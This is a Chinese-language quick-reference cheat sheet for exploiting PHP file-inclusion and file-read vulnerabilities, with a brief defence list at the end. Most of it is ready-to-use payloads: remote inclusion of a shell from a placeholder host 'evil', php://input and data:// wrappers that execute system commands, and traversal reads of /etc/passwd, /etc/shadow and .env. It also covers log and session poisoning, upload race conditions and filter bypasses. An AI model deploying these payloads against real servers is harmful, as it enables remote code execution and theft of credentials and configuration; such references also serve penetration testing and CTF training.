# 命令/代码执行补充与文件包含漏洞速查

## 一、PHP 文件包含（LFI/RFI）

### 1. 基础

```php
include($_GET['file']);   // LFI
allow_url_include=On 时可 RFI：include($_GET['file']);  # http://evil/shell.txt
```

### 2. 伪协议全家桶

```
php://filter/read=convert.base64-encode/resource=index.php    # 读源码
php://filter/convert.iconv.utf-8.utf-7/resource=index.php     # 编码绕过过滤
php://input + POST <?php system('id');?>                      # allow_url_include=On
data://text/plain,<?php system('id');?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
file:///etc/passwd
phar://upload/shell.jpg/inner.php                              # phar 反序列化/包含
zip:///var/www/upload/x.zip%23inner.php
```

### 3. 路径穿越

```
../ ../ ../      %2e%2e%2f      ..\/..\/（Windows）
/proc/self/environ、/proc/self/cmdline、/proc/self/fd/N
日志包含：/var/log/nginx/access.log（User-Agent 写马）、apache access.log、ssh auth.log
session 包含：/tmp/sess_<sessid>（session.upload_progress.enabled=On 写 session 内容）
```

### 4. 包含 + 上传组合拳

1. 上传图片马 → 包含执行；
2. 竞态：`session.upload_progress` 写入恶意反序列化/代码（PHP7+ 默认开启）；
3. 包含 /proc/self/environ（User-Agent 注入）；
4. tmp 文件竞态：php 上传临时文件在请求期间存在，`glob`爆破 /proc/self/fd。

### 5. 无回显利用

- 包含 + `file_put_contents` 写新文件落盘；
- 日志包含执行命令并写入可访问路径；
- `include` + `data://` 直接执行。

### 6. 绕过要点

- 固定后缀：`%00` 截断（旧版）；路径长度截断（Windows 240 字节 / Linux 4096）。
- 前缀固定：`file=upload/` + `../` 回溯；`php://filter` 不受 allow_url_include 限制（读源码首选）。
- `../` 过滤：双写 `....//`；编码 `%2e%2e%2f`。

## 二、文件读取漏洞通用利用

- 读配置：`/etc/passwd`、`/etc/shadow`（权限）、`/proc/self/environ`、`.env`、`config.php`、
  `WEB-INF/web.xml`（Java）、`META-INF/MANIFEST.MF`。
- nginx 配置读日志路径 → 日志包含；Docker 环境：`/proc/1/cgroup`、`.dockerenv` 探测。

## 三、防御清单

- 白名单文件名映射（`$whitelist = ['page1'=>'p1.php']`），禁用远程包含；
- open_basedir 限定目录；关闭 `allow_url_include`（PHP8 默认移除 data:// RFI 路径）；
- 日志与会话目录权限收紧；错误信息不回显路径。
